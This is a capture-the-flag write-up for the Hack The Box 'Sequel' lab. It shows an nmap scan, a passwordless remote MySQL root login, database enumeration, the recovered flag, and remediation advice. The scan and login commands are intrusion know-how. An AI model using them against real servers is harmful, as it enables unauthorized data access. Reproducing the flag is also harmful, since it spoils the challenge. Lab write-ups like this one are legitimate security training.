# Sequel

**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Linux · **Difficulty:** Tier 1

**Summary:** MariaDB/MySQL let `root` log in remotely with no password. From there I enumerated the databases and read the flag from the `config` table in `htb`.

## 1. Reconnaissance

A scan against the database port showed MySQL open:

```bash
nmap -sV -sC -p 3306 10.129.17.1
```

| Port | State | Service | Version |
| :--- | :--- | :--- | :--- |
| `3306/tcp` | `open` | `mysql` | MySQL / MariaDB (no authentication required) |

## 2. Foothold

### Passwordless root login
`root` has no password, so I connected remotely with strict certificate verification turned off:

```bash
mysql -u root -h 10.129.17.1 --ssl-verify-server-cert=FALSE
```

The session opened without asking for credentials.

### Reading the data
From the MySQL prompt:

```sql
-- 1. List databases
SHOW DATABASES;

-- 2. Select the target database
USE htb;

-- 3. List tables
SHOW TABLES;

-- 4. Read the config rows
SELECT * FROM config WHERE id = 5;
```

Result:

| id | name | value | Note |
| :---: | :---: | :---: | :---: |
| 5 | `flag` | `7b4bec00d1a39e3dd4e021ec3d915da8` | 🚩 **Flag** |

## 3. Privilege Escalation

Not applicable: database `root` already has full access to the data.

## 4. Conclusion

**Chain:** MySQL exposed on 3306 → passwordless remote `root` → full database read.

**Remediation:**
- **Harden the database:** run `mysql_secure_installation` right after deployment to disable remote `root` logins and enforce strong passwords.
- **Bind address:** set `bind-address = 127.0.0.1` in `my.cnf` so it only accepts local connections, and use SSH tunnels for remote admin.
